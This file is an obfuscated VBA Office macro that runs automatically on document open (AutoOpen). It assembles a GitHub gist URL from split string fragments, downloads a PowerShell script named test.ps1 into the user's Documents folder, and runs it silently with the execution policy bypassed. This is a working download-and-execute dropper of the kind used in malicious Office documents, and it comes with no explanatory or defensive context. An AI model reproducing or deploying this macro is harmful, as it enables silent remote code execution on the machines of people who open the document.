Sub AutoOpen()
    Dim bea2b19e869d906e19c2c5845ef99d624 As String
    Dim c1d374ac555d2f2500e5eba113b6d19df As String
    Dim b3d8f69e6a1e4e380a0b578412bb4728d As Object
    Dim e9a6a8866fc9657d77dc59f191d20178e As Object
    Dim fb6c5e53b78f831ff071400fd4987886a As Object
    Dim a6482a3f94854f5920ef720dbf7944d49 As String
    Dim a7eeee37ce4d5f1ce4d968ed8fdd9bcbb As String
    Dim a3e2b2a4914ae8d53ed6948f3f0d709b9 As String
    Dim a79e6d2cfe11f015751beca1f2ad01f35 As String
    Dim c19fe1eb6132de0cf2af80dcaf58865d3 As String
    Dim e71d80072ff5e54f8ede746c30dcd1d7a As String
    Dim f7182dd21d513b01e2797c451341280d0 As String
    
    a6482a3f94854f5920ef720dbf7944d49 = "https://gist.gith"
    a7eeee37ce4d5f1ce4d968ed8fdd9bcbb = "ubusercontent.co"
    a3e2b2a4914ae8d53ed6948f3f0d709b9 = "m/daffainfo/20a7b18ee31bd6a22acd1a90c1c7acb9"
    a79e6d2cfe11f015751beca1f2ad01f35 = "/raw/670f8d57403a02169d5e63e2f705bd4652781953/test.ps1"
    c19fe1eb6132de0cf2af80dcaf58865d3 = Environ("USERPROFILE")
    e71d80072ff5e54f8ede746c30dcd1d7a = "\Docum"
    f7182dd21d513b01e2797c451341280d0 = "ents\test.ps1"
    
    bea2b19e869d906e19c2c5845ef99d624 = a6482a3f94854f5920ef720dbf7944d49 & a7eeee37ce4d5f1ce4d968ed8fdd9bcbb & a3e2b2a4914ae8d53ed6948f3f0d709b9 & a79e6d2cfe11f015751beca1f2ad01f35
    c1d374ac555d2f2500e5eba113b6d19df = c19fe1eb6132de0cf2af80dcaf58865d3 & e71d80072ff5e54f8ede746c30dcd1d7a & f7182dd21d513b01e2797c451341280d0
    Set b3d8f69e6a1e4e380a0b578412bb4728d = CreateObject("MSXML2.XMLHTTP")
    b3d8f69e6a1e4e380a0b578412bb4728d.Open "GET", bea2b19e869d906e19c2c5845ef99d624, False
    b3d8f69e6a1e4e380a0b578412bb4728d.Send
    Set e9a6a8866fc9657d77dc59f191d20178e = CreateObject("ADODB.Stream")
    e9a6a8866fc9657d77dc59f191d20178e.Type = 1
    e9a6a8866fc9657d77dc59f191d20178e.Open
    e9a6a8866fc9657d77dc59f191d20178e.Write b3d8f69e6a1e4e380a0b578412bb4728d.responseBody
    e9a6a8866fc9657d77dc59f191d20178e.SaveToFile c1d374ac555d2f2500e5eba113b6d19df, 2
    e9a6a8866fc9657d77dc59f191d20178e.Close
    Set fb6c5e53b78f831ff071400fd4987886a = CreateObject("WScript.Shell")
    fb6c5e53b78f831ff071400fd4987886a.Run "powershell.exe -ExecutionPolicy Bypass -File """ & c1d374ac555d2f2500e5eba113b6d19df & """", 0, False
    Set b3d8f69e6a1e4e380a0b578412bb4728d = Nothing
    Set e9a6a8866fc9657d77dc59f191d20178e = Nothing
    Set fb6c5e53b78f831ff071400fd4987886a = Nothing
End Sub